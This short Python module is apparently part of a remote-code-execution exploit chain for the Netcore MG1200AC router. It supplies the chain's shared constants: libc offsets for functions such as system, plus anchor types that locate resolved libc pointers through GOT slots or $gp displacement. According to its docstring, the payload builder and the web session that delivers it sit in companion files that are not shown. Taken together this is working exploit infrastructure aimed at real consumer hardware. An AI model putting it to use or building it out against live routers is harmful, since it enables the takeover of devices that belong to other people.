#!/usr/bin/env python3

"""Netcore MG1200AC: the exploit constants both CLIs in this directory need.

The libc symbol table and the anchor/preset types; the payload machinery and the
web session that carries it live in `mg1200ac_run.py`, and a firmware this chain
does not know yet is derived by `mg1200ac_rom.py`. Analysis: rce/README.md.
"""

from typing import TypedDict

Anchor = tuple[str, int, str]
"""either ("abs", GOT slot of the ET_EXEC host, libc symbol) or ("gp",
displacement from $gp, libc symbol): the two ways the payload reaches a resolved
libc pointer (README §4.2, §4.3)"""


class Preset(TypedDict):
    pads: list[int]
    anchors: list[Anchor]


LIBC = {
    'memset': 0x3c270, 'system': 0x60320, 'exit': 0x5bb40, 'write': 0x0f70c,
    'strcmp': 0x3cd30, 'strlen': 0x3d780, 'fprintf': 0x318f0,
    'snprintf': 0x31930, 'sprintf': 0x319f0, 'atoi': 0x59b80}
"""Offsets into /lib/libc.so.0; one table covers every stock ROM, because the
three rootfs ship a byte-identical libc (md5 in README §4.3)"""


def describe(anchor: Anchor) -> str:
    """How an anchor is printed in messages and passed on the command line."""
    kind, addr, sym = anchor
    return f'{kind}:{addr:#x}({sym})'
